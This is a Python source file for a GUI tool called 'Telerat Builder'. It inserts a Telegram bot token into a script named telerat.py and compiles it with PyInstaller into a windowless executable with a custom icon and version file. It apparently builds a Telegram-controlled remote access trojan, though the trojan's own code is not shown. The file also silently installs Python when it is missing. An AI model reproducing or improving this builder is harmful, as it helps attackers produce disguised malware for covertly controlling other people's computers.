import os
import sys
import subprocess
from shutil import copyfile, rmtree
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QWidget, QPushButton, QLineEdit, QLabel
from PyQt5.QtGui import QIcon, QMovie, QPixmap
import threading

def check_python_version():
    result = subprocess.run(['python', '--version'], capture_output=True, text=True)
    return 'Python' in result.stdout

def install_requirements():
    subprocess.run([sys.executable, '-m', 'pip', 'install', '-r', os.path.join('Source_Files', 'requirements.txt')])

if check_python_version():
    try:
        import telebot
    except ImportError:
        install_requirements()
else:
    subprocess.run(['curl', '-s', 'https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe', '--output', 'python.exe'])
    subprocess.run(['python.exe', '/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_test=0', 'SimpleInstall=1'])
    os.remove('python.exe')
    install_requirements()

def start(bot_token, callback):
    print("Starting build with bot token:", bot_token)  # Debug statement
    telerat_path = os.path.join('Source_Files', 'telerat.py')
    with open(telerat_path, 'r', encoding='utf-8') as file:
        filedata = file.read()

    if 'ENTER_YOUR_BOT_TOKEN_HERE' in filedata:
        filedata = filedata.replace('ENTER_YOUR_BOT_TOKEN_HERE', bot_token)

    with open(telerat_path, 'w', encoding='utf-8') as file:
        file.write(filedata)

    subprocess.run(['pyinstaller', '--onefile', '--icon=Source_Files/icon.ico', '--version-file=Source_Files/version.txt', '-w', '-F', '--hidden-import=win32timezone', telerat_path])

    if os.path.exists('build'):
        rmtree('build')
    if os.path.exists('telerat.spec'):
        os.remove('telerat.spec')
    copyfile(os.path.join('dist', 'telerat.exe'), 'telerat.exe')
    if os.path.exists('dist'):
        rmtree('dist')

    with open(telerat_path, 'r', encoding='utf-8') as file:
        filedata = file.read()

    if bot_token in filedata:
        filedata = filedata.replace(bot_token, 'ENTER_YOUR_BOT_TOKEN_HERE')

    with open(telerat_path, 'w', encoding='utf-8') as file:
        file.write(filedata)

    callback()  # Call the callback function when done

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Telerat Builder')
        self.setGeometry(100, 100, 360, 300)

        # Set window icon
        self.setWindowIcon(QIcon('Source_Files/icon-build.ico'))

        self.layout = QVBoxLayout()

        self.label = QLabel("Enter Bot Token:", self)
        self.layout.addWidget(self.label)

        self.token_input = QLineEdit(self)
        self.layout.addWidget(self.token_input)

        self.build_button = QPushButton('Build', self)
        self.build_button.clicked.connect(self.on_click)
        self.layout.addWidget(self.build_button)

        # Loading animation setup
        self.loading_label = QLabel(self)
        self.movie = QMovie('Source_Files/loading.gif')
        self.loading_label.setMovie(self.movie)
        self.loading_label.setScaledContents(True)
        self.loading_label.setFixedSize(100, 100)  # Set the size of the animation
        self.layout.addWidget(self.loading_label)
        self.loading_label.hide()

        # Success page setup
        self.success_label = QLabel(self)
        self.success_label.setPixmap(QPixmap('Source_Files/checkmark.png'))
        self.success_label.setScaledContents(True)
        self.success_label.setFixedSize(100, 100)
        self.success_text = QLabel("Build Successful!", self)
        self.success_text.setStyleSheet("font-size: 18px; color: green;")
        self.layout.addWidget(self.success_label)
        self.layout.addWidget(self.success_text)
        self.success_label.hide()
        self.success_text.hide()

        container = QWidget()
        container.setLayout(self.layout)
        self.setCentralWidget(container)

    def on_click(self):
        bot_token = self.token_input.text()
        self.loading_label.show()
        self.movie.start()
        self.success_label.hide()
        self.success_text.hide()
        threading.Thread(target=self.build_process, args=(bot_token,)).start()

    def build_process(self, bot_token):
        start(bot_token, self.build_done)

    def build_done(self):
        self.movie.stop()
        self.loading_label.hide()
        self.success_label.show()
        self.success_text.show()

if __name__ == '__main__':
    # Run PyQt5 app
    pyqt_app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(pyqt_app.exec_())
